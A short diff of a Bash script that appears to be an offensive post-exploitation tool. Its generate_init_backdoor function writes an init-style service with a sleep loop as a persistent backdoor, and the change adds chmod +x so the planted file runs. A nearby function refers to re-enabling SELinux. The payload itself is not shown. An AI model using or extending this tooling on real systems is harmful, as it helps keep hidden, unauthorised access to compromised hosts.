@@ -93,7 +93,7 @@ function generate_init_backdoor {
 	echo "			sleep $SLEEP" >> $backdoor_path
 	echo "		done" >> $backdoor_path
 	echo "		;;" >> $backdoor_path
-	echo "  stop)" >> $backdoor_path
+	echo "	stop)" >> $backdoor_path
 	echo "		;;" >> $backdoor_path
 	echo "	restart)" >> $backdoor_path
 	echo "		;;" >> $backdoor_path
@@ -107,8 +107,8 @@ function generate_init_backdoor {
 	echo "		;;" >> $backdoor_path
 	echo "esac" >> $backdoor_path
 	echo "exit 0" >> $backdoor_path
-
-	}
+	chmod +x $backdoor_path
+}
 
 function enable_selinux {
 	echo -e "${item} Reenabling SELINUX"
